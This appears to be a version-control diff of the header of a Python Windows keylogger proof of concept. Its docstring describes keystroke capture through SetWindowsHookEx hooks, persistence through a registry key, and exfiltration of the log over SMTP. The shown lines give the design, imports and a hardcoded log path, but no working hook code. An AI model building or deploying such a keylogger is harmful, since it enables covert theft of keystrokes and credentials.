@@ -1,6 +1,8 @@
 """
 Author: Sunggwan Choi 
-Description: A simple PoC userland python keylogger which utilizes SetWindowsHookEx and CallNextHookEx API function. 
+Description: A simple PoC userland python keylogger which utilizes SetWindowsHookEx and CallNextHookEx API function.
+The hooks will capture a OnKeyboardEvent, everytime there is a keystroke. 
+Finally, it will establish a very basic persistence through registry key, and exfiltrate data through SMTP.
 
 Note: The source code will only be public for the duration of the tryout, since it has possibility of malicious usage 
 by malicious users. 
@@ -17,6 +19,7 @@ from email import encoders
 import win32console,win32gui
 import threading
 
+
 """
 File: pylogger.pyw
 
@@ -30,8 +33,6 @@ Features:
     
     - Persistence: Usage of registry 
 """
-
-
 # Hardcoded debug log file
 logFile = "C:\\Users\\Public\\Music\\log2.txt"
 
